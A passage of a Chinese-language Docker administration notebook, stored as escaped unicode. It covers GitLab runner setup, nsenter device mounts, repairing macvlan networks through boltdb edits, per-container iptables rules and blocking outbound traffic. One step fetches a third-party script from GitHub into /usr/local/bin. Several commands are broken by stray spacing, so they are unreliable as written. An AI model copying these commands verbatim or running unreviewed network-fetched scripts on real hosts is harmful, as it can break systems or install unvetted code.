POSTROUTING -j MASQUERADE -s 172.18. ${ SUBNET } .0/24 -d 0.0.0.0/0 \u8fd0\u884cdockerd\u6267\u884c\uff1a u=\"cy\" BRIDGE_NAME=br_ ${ u } DOCKER_ROOT=/home/ ${ u } /docker dockerd -D \\ -g ${ DOCKER_ROOT } /g \\ --exec-root= ${ DOCKER_ROOT } /e \\ -b ${ BRIDGE_NAME } \\ --dns=8.8.8.8 \\ --iptables=true \\ -H unix:// ${ DOCKER_ROOT } /docker.sock \\ -p ${ DOCKER_ROOT } /docker.pid \u914d\u7f6e\u4f7f\u7528Docker\u7248\u672c\u7684Gitlab CI \u00b6 \u53c2\u8003\u6587\u6863\uff1a \u5b98\u65b9\u6559\u7a0b https://docs.gitlab.com/runner/ \u9ad8\u7ea7\u914d\u7f6e https://docs.gitlab.com/runner/configuration/advanced-configuration.html \u4eba\u5bb6\u8fd9\u4e1c\u897f\u672c\u8d28\u4e0a\u662f\u4e00\u4e2adocker\u5bb9\u5668\uff0c\u4f46\u662f\u628a\u4e3b\u673a\u7684docker sock\u4f20\u5165\u5230\u5bb9\u5668\u4e2d\uff0c\u6240\u4ee5\u5bb9\u5668\u5185\u53ef\u4ee5\u521b\u5efa\u5bb9\u5668 \u6211\u8fd9\u91cc\u7684\u6559\u7a0b\u7740\u91cd\u89e3\u51b3\u4e24\u4e2a\u95ee\u9898\uff1a\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684\u955c\u50cf\uff0c\u8bbe\u7f6eDNS \u7b2c\u4e00\u6b65\u5f53\u7136\u662fpull\u4eba\u5bb6\u7684runner\u955c\u50cf\u54af \u00b6 docker pull gitlab/gitlab-runner \u7b2c\u4e8c\u6b65 \u83b7\u53d6CI\u8fde\u63a5\u65f6\u9700\u8981\u7684token \u00b6 \u5728\u7ba1\u7406\u5458\u754c\u9762 Overview\u4e0bRunners\u70b9\u5f00\u5373\u53ef\u770b\u5230 \u7f51\u5740\uff1a /admin/runners \u7b2c\u4e09\u6b65 \u6ce8\u518c\u4ee5\u751f\u6210\u521d\u59cb\u7684\u914d\u7f6e\u4fe1\u606f \u00b6 \u53c2\u8003https://docs.gitlab.com/runner/register/index.html#docker \u5047\u8bbe\u5bb9\u5668\u914d\u7f6e\u6587\u4ef6\u4fdd\u5b58\u5728/dockerfiles/gitlabrunner\u4e2d\uff0c\u5176\u4e2ddocker-image\u662f\u9ed8\u8ba4\u8dd1\u4efb\u52a1\u7684\u955c\u50cf docker run --rm -t -i -v /dockerfiles/gitlabrunner:/etc/gitlab-runner --dns 10.0.0.1 gitlab/gitlab-runner register --non-interactive \\ --url \"https://gitlab.com/\" \\ --registration-token \"\u4e0a\u4e00\u6b65\u83b7\u5f97\u7684token\" \\ --executor \"docker\" \\ --docker-image myubuntu:latest \\ --description \"docker-runner\" \\ --run-untagged \\ --locked=\"false\" \u7b2c\u56db\u6b65 \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 \u00b6 \u53c2\u8003\u9ad8\u7ea7\u914d\u7f6e https://docs.gitlab.com/runner/configuration/advanced-configuration.html \u548c https://docs.gitlab.com/runner/executors/docker.html#how-pull-policies-work cd /dockerfiles/gitlabrunner #\u4f60\u7684\u914d\u7f6e\u6587\u4ef6\u76ee\u5f55 sudo vim config.yml \u4e3a\u4e86\u8dd1\u672c\u5730\u5df2\u7ecf\u5b58\u5728\u7684\u955c\u50cf\uff08\u9ed8\u8ba4\u4e3aalways\u8868\u793a\u53ea\u80fd\u8dd1dockerhub\u4e0a\u7684\uff09\uff0c\u5728[runners.docker]\u4e2d\u9700\u8981\u6dfb\u52a0\uff1a pull_policy = \"never\" \u6216\u8005\u8fd9\u91cc\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528\u201dif-not-present\u201d \u4e0d\u5b58\u5728\u5c31pull \u53e6\u5916 \u5982\u679c\u9700\u8981\u4fee\u6539\u5bb9\u5668DNS\uff0c\u4e5f\u6dfb\u52a0\u8fdb\u53bb\u5373\u53ef dns = [\"10.0.0.1\"] \u7b2c\u4e94\u6b65 \u542f\u52a8runner\u5bb9\u5668 \u00b6 \u5982\u679c\u9700\u8981\u6539dns\uff0c\u8fd9\u91cc\u4e5f\u522b\u5fd8\u8bb0\u5199\u4e0a docker run - d -- name gitlab - runner -- restart always \\ - v / dockerfiles / gitlabrunner : / etc / gitlab - runner \\ - v / var / run / docker . sock : / var / run / docker . sock \\ -- dns 10.0 . 0.1 \\ gitlab / gitlab - runner : latest \u7b2c\u516d\u6b65 \u521b\u5efa\u4e00\u4e2a\u65b0\u7684repo\u6765\u6d4b\u8bd5\u4e00\u4e0b\u5427 \u00b6 \u65b0\u5efa .gitlab-ci.yml \u6587\u4ef6\uff0c\u8fd9\u91cc\u4f7f\u7528\u81ea\u5df1\u7f16\u8bd1\u7684myubuntu\u955c\u50cf image : myubuntu : latest test : app : script : - echo ok - curl ip . cn \u7136\u540e\u5728gitlab\u7684\u4ed3\u5e93\u9875\u9762 \u6700\u65b0\u7684\u4e00\u6b21commit message\u53f3\u4fa7\u5c31\u6709CI\u6210\u529f\u4e0e\u5426\u72b6\u6001\u7684\u56fe\u6807 \u70b9\u8fdb\u53bb\u770b\u8be6\u7ec6\u65e5\u5fd7\u54af \u4e3a\u5df2\u7ecf\u5b58\u5728\u7684\u5bb9\u5668\u521b\u5efa\u4e34\u65f6\u7aef\u53e3\u6620\u5c04 socat \u00b6 @TAG \u7aef\u53e3\u8f6c\u53d1 \u51fa\u4e8e\u5b66\u4e60\u76ee\u7684\uff0c\u60f3\u5feb\u901f\u5730\u5efa\u7acb\u4e00\u4e0b\u4e34\u65f6\u7684Docker\u5bb9\u5668\u7aef\u53e3\u6620\u5c04 \u7528socat\u54af\uff1a socat TCP4-LISTEN:9300,fork TCP4:172.17.0.3:9300 \u5982\u679c\u6ca1\u6709socat\uff0c\u53ef\u4ee5\uff1a docker run -ti --rm --net host bobrik/socat TCP4-LISTEN:9300 TCP4:172.17.0.3:9300 \u67e5\u770b\u6240\u6709\u5bb9\u5668\u5185\u5b58\u5360\u7528 \u5e76\u6392\u5e8f \u00b6 docker stats \u5c31\u80fd\u770b\u5230\u5b9e\u65f6\u66f4\u65b0\u7684\u7ed3\u679c\uff0c\u4f46\u5e76\u6ca1\u6709\u63d0\u4f9b\u6392\u5e8f\u529f\u80fd docker stats --no-stream|sort -h -r -k 4,4 \u6392\u5e8f\u5217\u5bf9\u5e94\u5173\u7cfb\u5982\u4e0b\uff1a \u5217\u53f7 \u5217\u540d 3 CPU 4 \u5185\u5b58 8 \u7f51\u7edc\u6d41\u5165 10 \u7f51\u7edc\u6d41\u51fa 11 \u6587\u4ef6\u5199\u5165 13 \u6587\u4ef6\u8bfb\u53d6 14 \u5bb9\u5668\u5185\u7ebf\u7a0b\u6570\u91cf(PID\u6570) \u8fd0\u884c\u4e2d\u7684\u5bb9\u5668\u6dfb\u52a0\u76ee\u5f55\u6302\u8f7d \u00b6 Docker\u81ea\u8eab\u53ea\u5141\u8bb8\u5728\u521b\u5efa\u5bb9\u5668\u7684\u65f6\u5019\u6307\u5b9a-v\u8fdb\u884c\u76ee\u5f55\u6302\u8f7d\uff0c\u600e\u4e48\u5728\u4e0d\u505c\u6b62\u5bb9\u5668\u7684\u60c5\u51b5\u4e0b\u589e\u52a0\u6302\u8f7d\u5462\uff1f \u6ce8\u610f\u6b64\u65b9\u6cd5\u5728\u5bb9\u5668\u91cd\u542f\u540e\u5373\u5931\u6548\uff0c\u9700\u8981\u91cd\u65b0\u6302\u8f7d \u53c2\u8003\uff1ahttps://medium.com/kokster/mount-volumes-into-a-running-container-65a967bee3b5 \u65b9\u6cd5\u662f\u628a\u5757\u8bbe\u5907\u6302\u8f7d\u5230\u5bb9\u5668\u4e2d\uff0c\u7136\u540e\u53ef\u4ee5\u4f7f\u7528bind mount \u5047\u8bbe\u5bb9\u5668\u540d\u79f0\u4e3aapp_container\uff0c\u9700\u8981\u6302\u8f7d/dev/sdb1\u8fd9\u4e2a\u8bbe\u5907\uff0c\u547d\u4ee4\u5982\u4e0b\uff1a Step1: \u9996\u5148\u8981\u67e5\u770b\u8bbe\u5907id\u4ee5\u4fbf\u5728\u5bb9\u5668\u4e2dmknod\u521b\u5efa\u8bbe\u5907\uff0c\u7136\u540e\u4f7f\u7528nsenter\u4f7f\u7528\u4e3b\u673a\u7684\u6743\u9650\u6302\u8f7d\u8bbe\u5907 Step2: \u73b0\u5728\u5c31\u53ef\u4ee5\u5728\u5bb9\u5668\u4e2d\u4f7f\u7528/tmpmount\u8bfb\u53d6\u5230\u8bbe\u5907\u4e86\uff0c\u4f46\u5982\u679c\u6211\u4eec\u53ea\u9700\u8981\u6302\u8f7d\u5176\u4e2d\u4e00\u4e2a\u6587\u4ef6\u5939 \u4f8b\u5982\u8bbe\u5907\u7684data\u6587\u4ef6\u5939\u6302\u8f7d\u5230\u5bb9\u5668\u7684/newdata\uff0c\u8fd8\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\uff1a Step3: \u6700\u540e\u6e05\u7406\u6389\u4e34\u65f6\u6302\u8f7d\u7684/tmpmount \u4e0d\u4f1a\u5f71\u54cdbind mount\u6302\u8f7d\u51fa\u6765\u7684/newdata CONTAINER_NAME=\"app_container\" DEVICE_NAME=\"/dev/sdb1\" MOUNT_SRC=\"data\" MOUNT_TARGET=\"/newdata\" # Step1 x=$(grep $DEVICE_NAME /proc/self/mountinfo|cut -d ' ' -f 3) docker exec -it -u root $CONTAINER_NAME sh -c \"[ -b $DEVICE_NAME ] || mknod -m 0600 $DEVICE_NAME b ${ x / : / } \" sudo nsenter --target \"$(docker inspect --format '{{.State.Pid}}' $CONTAINER_NAME )\" --mount --uts --ipc --net --pid -- sh -c \"mkdir -p /tmpmount;mount $DEVICE_NAME /tmpmount\" # Step2 sudo nsenter --target \"$(docker inspect --format '{{.State.Pid}}' $CONTAINER_NAME )\" --mount --uts --ipc --net --pid -- sh -c \"mkdir -p $MOUNT_TARGET ; mount -o bind /tmpmount/ $MOUNT_SRC $MOUNT_TARGET \" # Step3 sudo nsenter --target \"$(docker inspect --format '{{.State.Pid}}' $CONTAINER_NAME )\" --mount --uts --ipc --net --pid -- sh -c \"umount /tmpmount\" Docker\u4f7f\u752832\u4f4d\u955c\u50cf \u00b6 \u4f8b\u5982ubuntu16.04.5 32\u4f4d\u955c\u50cf \u4ece\u8fd9\u91cc\u4e0b\u8f7di386\u540e\u7f00\u7684 ubuntu-base-16.04.5-base-i386.tar.gz \uff1a http://cdimage.ubuntu.com/ubuntu-base/releases/16.04/release/ \u4e0b\u8f7d\u4e86\u4e4b\u540e\u76f4\u63a5\u4ea4\u7ed9docker\u5bfc\u5165\u5373\u53ef\uff1a docker import \u6587\u6863 cat ubuntu - base - 16.04 . 5 - base - i386 . tar . gz | docker import - ubuntu1604_32bit \u627e\u5230/var/lib/docker\u4e2d\u5bb9\u5668\u7684\u6570\u636e\u5b58\u50a8\u76ee\u5f55 \u00b6 \u4f7f\u7528 docker-backup : curl - Lo / usr / local / bin / docker - backup https : // raw . githubusercontent . com / vincepare / docker - backup / master / docker - backup . sh && chmod + x / usr / local / bin / docker - backup docker - backup ls - w container \u4e3e\u4e2a\u4f8b\u5b50 Apache\u5bb9\u5668\u7531\u4e8e/tmp/httpd_lua_shm.1\u7684\u5b58\u5728\u8dd1\u4e0d\u8d77\u6765\uff0c\u8bd5\u8bd5\u76f4\u63a5\u5220\u9664\u5bb9\u5668\u5185\u7684\u8fd9\u4e2a\u6587\u4ef6 for i in `d ps -a|grep Exit|grep minutes|awk '{print $1}'`; do rm `docker-backup ls -w $i`/tmp/httpd_lua_shm.1; d start $i ; done \u642c\u8fd0\u670d\u52a1\u5668\u540e\u7f51\u6bb5\u53d8\u5316 \u76f4\u63a5\u4fee\u6539Docker\u5e95\u5c42\u6570\u636e\u5e93\u548c\u914d\u7f6e\u6587\u4ef6\u4fee\u590dmacvlan\u7f51\u7edc \u00b6 \u9700\u6c42\uff1a\u670d\u52a1\u5668\u673a\u623f\u642c\u8fc1\uff0c\u4ece10.214.10.x\u53d8\u4e3a10.214.160.x\uff0c\u914d\u7f6e\u7684macvlan\u5bb9\u5668\u5c31\u4e0d\u80fd\u8bbf\u95ee\u4e86 Docker\u6ca1\u6709\u63d0\u4f9b\u4fee\u6539\u7f51\u7edc\u914d\u7f6e\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u5c31\u76f4\u63a5\u6539Docker\u7684\u6570\u636e\u5e93\u548c\u914d\u7f6e\u6587\u4ef6\u5457 \u4e0d\u8fd9\u6837\u76f4\u63a5\u6539\u5e95\u5c42\u6587\u4ef6\u4e5f\u662f\u53ef\u4ee5\u7684\uff0c\u9700\u8981\u5148disconnect\u65e7\u7684macvlan\u6240\u6709\u5bb9\u5668\uff0c\u7136\u540e\u5220\u6389\u91cd\u5efa\u8fd9\u4e2anetwork\uff0c\u518d\u4e00\u4e2a\u4e2a\u52a0\u56de\u6765 \u7f51\u7edc\u914d\u7f6e\u7684\u6570\u636e\u5e93\u5728 /var/lib/docker/network/files/local-kv.db \uff0c\u672c\u8d28\u4e0a\u662fboltdb\uff0c\u9700\u8981\u4f7f\u7528docker\u7684 libkv \u6765\u8fdb\u884c\u8bbf\u95ee \u6ce8\u610f\u5230ip\u524d\u7f00\u7684\u957f\u5ea6\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u76f4\u63a5sed\u662f\u4e0d\u884c\u7684\uff0c\u4f1a\u635f\u574f\u6570\u636e\u5e93\uff08\u5982\u679c\u957f\u5ea6\u6ca1\u53d8\u53ef\u4ee5\u76f4\u63a5sed\uff09\uff0c\u64cd\u4f5c\u524d\u8bb0\u5f97\u5907\u4efd \u53c2\u8003 https://blog.qiqitori.com/?p=463 \u52a0\u4ee5\u4fee\u6539\uff0c\u9700\u8981\u5728 docker pull golang:1.8 \u4e2d\u7f16\u8bd1\u8fd0\u884c package main import ( \"time\" \"log\" \"strings\" \"github.com/docker/libkv\" \"github.com/docker/libkv/store\" \"github.com/docker/libkv/store/boltdb\" ) func init () { // Register boltdb store to libkv boltdb . Register () } func main () { client : = \"./local-kv.db\" // ./ appears to be necessary // Initialize a new store kv , err : = libkv . NewStore ( store . BOLTDB , // or \"boltdb\" [] string { client }, & store . Config { Bucket : \"libnetwork\" , ConnectionTimeout : 10 * time . Second , }, ) if err != nil { log . Fatalf ( \"Cannot create store: %v\" , err ) } pair , err : = kv . List ( \"docker/network\" ) for _ , p : = range pair { println ( \"key:\" , string ( p . Key )) val : = strings . Replace ( string ( p . Value ), \"10.214.10.\" , \"10.214.160.\" , - 1 ) println ( \"value:\" , val ) err = kv . Put ( p . Key , [] byte ( val ), nil ) } } \u5176\u4e2d\u9700\u8981\u6ce8\u610fgolang1.8\u7684strings\u6ca1\u6709ReplaceAll\u65b9\u6cd5\uff1bstring\u8f6cbytes\u6570\u7ec4\u7528 []byte(...) \u5373\u53ef\uff1b println \u4e0d\u662ffmt\u5e93\u7684\uff0c\u662f\u5f80stderr\u8f93\u51fa\u7684 \u9664\u4e86\u7f51\u7edc\u6570\u636e\u5e93\u8fd8\u9700\u8981\u4fee\u6539\u5bb9\u5668\u7684.json\u914d\u7f6e\u6587\u4ef6\uff1a /var/lib/docker/containers/*/*.json sed - i 's/10.214.10./10.214.160./g' / var / lib / docker / containers /*/*. json \u7136\u540e\u5c31\u80fd\u542f\u52a8docker\u4e86\uff0c\u5982\u679c\u6709\u5bb9\u5668\u7684\u5f53\u524dip\u5df2\u7ecf\u88ab\u5176\u4ed6\u8bbe\u5907\u5360\u7528\uff0c\u53ef\u4ee5\u901a\u8fc7\u8131\u79bb\u7f51\u7edc\u518d\u52a0\u5165\u6765\u4fee\u6539ip docker network disconnect macvlan_name container_name docker network connect macvlan_name container_name --ip \u65b0\u7684ip \u5982\u679c\u65b0\u7684ip\u8fd8\u662fping\u4e0d\u4e86\uff0c\u8bd5\u8bd5\u91cd\u542f\u5bb9\u5668 \u83b7\u53d62\u4e2a\u6708\u524d\u9000\u51fa\u7684\u5bb9\u5668\u5217\u8868\uff0c\u4ee5\u7a7a\u683c\u5206\u9694 \u00b6 docker ps -a --format ' {{ .Names }} {{ .Status }} '|grep \"2 month\"|awk '{print $1}'|tr '\\r\\n' ' ' \u5bb9\u5668\u5185\u6ca1\u6709ping, ip\uff1f\u76f4\u63a5nsenter\u8fdb\u53bb\u770b\u770b \u00b6 netin(){ nsenter --target `docker inspect --format ' {{ .State.Pid }} ' $1` --net --pid /bin/bash } \u8fd9\u662f\u8fdb\u5165docker\u5bb9\u5668\u7684namespace\uff0c\u4f46\u53ea\u5207\u6362\u7f51\u7edc\u548c/proc\uff0c\u6587\u4ef6\u7cfb\u7edf\u7b49\u8fd8\u662f\u4f7f\u7528\u4e3b\u673a\u7684 \u8fdb\u5165\u540ebash\u4f3c\u4e4e\u6ca1\u53d8\uff0c\u8fd9\u65f6\u53ef\u4ee5ps\u770b\u770b\u8fdb\u7a0b\u5217\u8868\u53d8\u4e86\u5c31\u8bf4\u660e\u5728\u5bb9\u5668\u91cc\u9762\u4e86\uff0c\u7136\u540e\u53ef\u4ee5\u6109\u5feb\u5730ifconfig\u548cping\u4e86 \u4e5f\u53ef\u4ee5\u4f7f\u7528ip\u547d\u4ee4\u6307\u5b9anetns\u7684\u65b9\u5f0f ip netns exec \u540d\u79f0 \u547d\u4ee4 1 2 3 4 5 6 #!/bin/bash NAME = \"container name\" mkdir -p /var/run/netns ID = ` docker inspect --format = '{{ .State.Pid }}' $NAME ` sudo ln -sf \"/proc/ $ID /ns/net\" /var/run/netns/ $NAME exec sudo ip netns exec $NAME \" $@ \" \u4e3amacvlan\u7684\u5bb9\u5668\u914d\u7f6e\u53ea\u5141\u8bb8IP\u6bb5\u8bbf\u95ee \u00b6 \u5c06\u5bb9\u5668\u66b4\u9732\u5728\u6574\u4e2a\u5185\u7f51\u8fd8\u662f\u4e0d\u591f\u5b89\u5168\uff0c\u4e0d\u5982\u4f7f\u7528iptables\u53ea\u5141\u8bb8\u7279\u5b9aIP\u6bb5\u8bbf\u95ee\u8fd9\u4e2a\u5bb9\u5668\u7684IP \u6309\u4e0a\u8ff0\u64cd\u4f5c\u4e4b\u540e\uff0c\u5047\u8bbe\u5bb9\u5668\u540d\u79f0\u4e3aname\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5148\u5efa\u7acb\u4e00\u4e2aalias\u6765\u5feb\u901fiptables: \u53c2\u8003\uff1a https://unix.stackexchange.com/questions/11851/iptables-allow-certain-ips-and-block-all-other-connection alias i=\"sudo ip netns exec name iptables\" i -P FORWARD DROP # we aren't a router i -A INPUT -m state --state INVALID -j DROP i -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT i -A INPUT -i lo -j ACCEPT i -A INPUT -s 10.0.0.1/24 -j ACCEPT i -A INPUT -s 172.19.0.1/24 -j ACCEPT i -P INPUT DROP # Drop everything we don't accept \u6548\u679c\u5c31\u662f\u53ea\u6709\u5185\u7f5110.0.0.1-10.0.0.254\u7684ip\u624d\u80fd\u8bbf\u95ee\u8fd9\u4e2a\u5bb9\u5668\u7684IP\uff0c\u5176\u4ed6\u6765\u6e90\u90fd\u4e0d\u80fdping\u901a\u8fd9\u4e2a\u5bb9\u5668 \u4e0b\u9762\u7684bash\u811a\u672c\u4f1a\u81ea\u52a8\u5bf9\u5bb9\u5668\u7684\u6240\u6709IP\u6bb5\u5141\u8bb8\u8bbf\u95ee\uff0c\u5e76\u62d2\u7edd\u5176\u4ed6\u8bbf\u95ee\uff1a \u5176\u4e2d\u7684docker inspect\u547d\u4ee4\u53ef\u4ee5\u83b7\u53d6\u5bb9\u5668\u62e5\u6709\u7684\u6240\u6709IP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #!/bin/bash set -ex DOCKERNAME = \"xxx\" NAME = \"xx\" shopt -s expand_aliases sudo mkdir -p /var/run/netns ID = ` docker inspect --format = '{{ .State.Pid }}' ${ DOCKERNAME } ` sudo ln -sf \"/proc/ $ID /ns/net\" /var/run/netns/ ${ NAME } alias i = \"sudo ip netns exec ${ NAME } iptables\" i -F i -P FORWARD DROP # we aren't a router i -A INPUT -m state --state INVALID -j DROP i -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT i -A INPUT -i lo -j ACCEPT docker inspect --format = '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{\"\\n\"}}{{end}}' ${ DOCKERNAME } | xargs -i sudo ip netns exec ${ NAME } iptables -A INPUT -s '{}/24' -j ACCEPT i -P INPUT DROP # Drop everything we don't accept \u4ece/var/lib/docker\u63d0\u53d6\u5bb9\u5668\u5f00\u59cb\u65f6\u95f4 \u00b6 \u8bfb\u53d6/var/lib/docker/containers/*/config.v2.json\u53ef\u4ee5\u8bfb\u5230\u5bb9\u5668\u5f00\u59cb\u65f6\u95f4 \u4f46\u4f7f\u7528\u540c\u4e00\u4e2a\u6587\u4ef6\u5939\u4e0bhostname\u8fd9\u4e2a\u6587\u4ef6\u7684\u65f6\u95f4\u6233\u66f4\u53ef\u9760\uff0c\u65e0\u9700\u8003\u8651\u65f6\u533a\u6362\u7b97\u4e0d\u540c\u670d\u52a1\u5668\u65f6\u95f4\u4e0d\u540c\u6b65\u7b49\u95ee\u9898\u3002\u8ba1\u7b97\u6587\u4ef6\u4ea7\u751f\u7684\u76f8\u5bf9\u65f6\u95f4\u7528os.path.getmtime(\u8fd9\u4e2a\u6587\u4ef6)\u51cf\u53bb\u8fd9\u4e2a\u65f6\u95f4\u6233\u5373\u53ef\u3002 \u5bfc\u5165\u5230mysql \u5b8c\u6574\u4ee3\u7801\uff1a \u6267\u884c\u7684\u65f6\u5019\u9700\u8981server name\u4f5c\u4e3a\u53c2\u6570 from bugid import runsql import os , sys , glob , json import datetime import re server = sys . argv [ 1 ] os . chdir ( \"/var/lib/docker/containers\" ) sql = \"replace into dockers(server, name, id, starttime, runningtime, memlimit) values \" sqlpending = [] t = 0 for i in glob . glob ( \"*/\" ) : if not os . path . exists ( i+ \"hostname\" ) : # print ( i ) continue data = json . loads ( open ( i+ \"config.v2.json\" ). read ()) name = data [ \"Name\" ] starttime = data [ \"State\" ][ \"StartedAt\" ] endtime = data [ \"State\" ][ \"FinishedAt\" ] if endtime ! = \"0001-01-01T00:00:00Z\" : runningtime = ( datetime . datetime . strptime ( endtime . split ( \".\" )[ 0 ], \"%Y-%m-%dT%H:%M:%S\" ) - datetime . datetime . strptime ( starttime . split ( \".\" )[ 0 ], \"%Y-%m-%dT%H:%M:%S\" )). total_seconds () else : runningtime = - 1 memlimit = int ( json . load ( open ( i+ \"hostconfig.json\" ))[ \"Memory\" ] / 1024 / 1024 ) sqlpending . extend ([ server , name [ 1 : ], i [:- 1 ], int ( os . path . getmtime ( i+ \"hostname\" )), runningtime , memlimit ]) sql += \"(%s, %s, %s, %s, %s, %s),\" # print ( sqlpending ) runsql ( sql [:- 1 ], * sqlpending ) \u56fa\u5b9a\u5bb9\u5668\u7684IP \u00b6 \u53c2\u8003\uff1a https://github.com/johnnian/Blog/issues/16 \u9ed8\u8ba4\u7684bridge\u7f51\u7edc\u4e0d\u652f\u6301\u6307\u5b9aip\uff0c\u9700\u8981\u518d\u521b\u5efa\u4e00\u4e2a\u7f51\u7edc\uff1a docker network create --subnet=172.18.0.0/16 b \u521b\u5efa\u5bb9\u5668\u7684\u65f6\u5019\u53ef\u4ee5 --network b --ip 172.18.0.2 \u5df2\u7ecf\u5b58\u5728\u7684\u5bb9\u5668\u9700\u8981\u7528\uff1a docker network connect --ip 172.18.0.2 --alias ${ name } b ${ name } \u4e0d\u60f3\u6539\u52a8docker\u7684network\u8fd8\u6709\u4e2a\u4e34\u65f6\u7684\u529e\u6cd5\uff1a \u83b7\u53d6\u5bb9\u5668IP \u66f4\u65b0\u4e3b\u673a/etc/hosts \u00b6 \u9700\u8981\u5148\u5c06\u5f53\u524d\u7684hosts\u6587\u4ef6\u590d\u5236\u4e3a/etc/hosts.base \u5176\u4e2dbridge\u53ef\u80fd\u9700\u8981\u6539\u6210docker inspect\u8f93\u51fa\u7684\u5176\u4ed6network\u540d\u79f0 1 2 3 4 5 6 7 #!/bin/bash if [[ $EUID -ne 0 ]] ; then echo \"This script must be run as root\" exit 1 fi cp /etc/hosts.base /etc/hosts echo ` docker inspect ${ name } --format '{{.NetworkSettings.Networks.bridge.IPAddress}}' ` ${ name } >> /etc/hosts \u53e6\u5916 \u4f60\u8fd8\u53ef\u4ee5\u542f\u52a8\u4e2adns\u670d\u52a1\u7684\u5bb9\u5668\u6765\u89e3\u6790\u5bb9\u5668hostname: https://stackoverflow.com/questions/37242217/access-docker-container-from-host-using-containers-name/45071126#45071126 Docker\u5bb9\u5668\u7981\u6b62\u4e3b\u52a8\u8054\u7f51 \u4f46\u5bf9\u5916\u63d0\u4f9bweb\u670d\u52a1 \u00b6 @TAG \u7aef\u53e3\u6620\u5c04 ctf \u9996\u5148\u6392\u9664 --network none \uff0c\u8fd9\u6837\u6ca1\u6709\u7f51\u5361\u600e\u4e48\u505a\u7aef\u53e3\u6620\u5c04 \u4e0b\u9762\u5047\u8bbe\u5bb9\u5668\u540d\u79f0\u4e3a ${CONTAINER} \uff0c\u5bb9\u5668\u542f\u52a8\u7684http\u670d\u52a1\u7aef\u53e3\u4e3a5000 \u7b80\u5355\u65b9\u6848 \u76f4\u63a5\u5220\u9664\u9ed8\u8ba4\u8def\u7531 \u00b6 nsenter --target `docker inspect --format '{{.State.Pid}}' ${ CONTAINER } ` --net --pid route delete default \u597d\u5904\u5728\u4e8e\u8bbf\u95ee\u7f51\u7edc\u7684\u8bf7\u6c42\u80fd\u8fc5\u901f\u62a5\u9519 Network is unreachable \uff0c\u4e5f\u4e0d\u9700\u8981\u989d\u5916\u7684\u5bb9\u5668\u53c2\u6570\u914d\u7f6e \u4f46\u5bb9\u5668\u6bcf\u6b21\u91cd\u542f\u90fd\u9700\u8981\u91cd\u65b0\u6267\u884c \u590d\u6742\u65b9\u6848 \u521b\u5efa\u4e2a\u5185\u90e8\u7f51\u7edc Nginx\u8f6c\u53d1 \u00b6 docker\u7684\u521b\u5efa\u7f51\u7edc\u63d0\u4f9b\u4e86 --internal \u53c2\u6570\uff0c\u610f\u601d\u662f\u4e0d\u5141\u8bb8\u8fd9\u4e2a\u7f51\u7edc\u8bbf\u95ee\u5916\u754c\uff0c\u4f46\u662f\u8bbf\u95ee\u7f51\u7edc\u7684\u8bf7\u6c42\u4e0d\u4f1a\u7acb\u523b\u8fd4\u56de\uff0c\u6548\u679c\u50cf\u662f\u4e00\u76f4\u4e22\u5305\u5c31\u6ca1\u54cd\u5e94 \u8fd9\u91cc\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a ${CONTAINER}_nonet \u7684\u7f51\u7edc\uff0c\u542f\u52a8\u5bb9\u5668\u7684\u65f6\u5019\u6307\u5b9a\u8fd9\u4e2a\u7f51\u7edc\u5e76\u914d\u7f6e\u522b\u540dapp \u7136\u540e\u8fd8\u9700\u8981Nginx\u5bb9\u5668\u540c\u65f6\u52a0\u5165\u9ed8\u8ba4\u7f51\u7edc\u548c\u8fd9\u4e2a\u7f51\u7edc\u6765\u8fdb\u884c\u8f6c\u53d1\uff0cNginx\u5bb9\u5668\u4e00\u5f00\u59cb\u521b\u5efa\u540e\u7684\u542f\u52a8\u4f1a\u62a5\u9519\u53cd\u590d\u91cd\u542f\uff08\u65e0\u6cd5\u89e3\u6790app\uff09\uff0c\u52a0\u5165\u7f51\u7edc\u540e\u5373\u53ef\u6b63\u5e38\u542f\u52a8 docker network create $ { CONTAINER } _nonet -- internal docker run -- network $ { CONTAINER } _nonet -- network - alias app ... docker run -- name $ { CONTAINER } _nginx - d - v `pwd` / nginxconf :/ etc / nginx / conf . d - p 20528 : 80 -- restart = always nginx docker network connect $ { CONTAINER } _nonet $ { CONTAINER } _nginx -- alias nginx \u5176\u4e2dnginxconf\u6587\u4ef6\u5939\u91cc\u653e\u4e00\u4e2adefault.conf: server { listen 80; server_name localhost; location / { proxy_pass http://app:5000; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } \u65e2\u7136\u7528\u4e86\u53cd\u5411\u4ee3\u7406\uff0c\u5e94\u7528\u5c42\u4e5f\u9700\u8981\u914d\u7f6e\u4e00\u4e0bIP\u76f8\u5173\u7684\u4fee\u590d\u624d\u80fd\u4f7f\u65e5\u5fd7\u663e\u793a\u8bbf\u95ee\u8005ip\uff08\u800c\u4e0d\u662fNginx\u5bb9\u5668\u7684IP\uff09\uff0c\u6bd4\u5982Flask 1.0\u9700\u8981\uff1a from werkzeug.middleware.proxy_fix import ProxyFix app . wsgi_app = ProxyFix ( app . wsgi_app ) \u8fd9\u4e2a\u65b9\u6848\u6709\u70b9\u590d\u6742\uff0c\u4f46\u597d\u5904\u5728\u4e8e\u91cd\u542f\u5bb9\u5668\u4e0d\u9700\u8981\u989d\u5916\u914d\u7f6e\uff0c\u53cd\u6b63\u8fde\u4e0d\u4e0a\u7f51 \u574f\u5904\u5728\u4e8e\u8bbf\u95ee\u7f51\u7edc\u7684\u8bf7\u6c42\u4f1a\u4e00\u76f4\u5361\u4f4f\uff0c\u5e94\u7528\u5c42\u9700\u8981\u81ea\u5df1\u8003\u8651\u8d85\u65f6 \u4f60\u53ef\u4ee5\u628a\u8fd9\u4e24\u79cd\u65b9\u6848\u7ed3\u5408\u8d77\u6765\uff0c\u5373\u4f7f\u5fd8\u4e86\u5220\u9ed8\u8ba4\u8def\u7531\u4e5f\u80fd\u4fdd\u8bc1\u4e0d\u80fd\u8054\u7f51 \u79c1\u6709registry\u7684api \u00b6 \u6587\u6863\uff1a 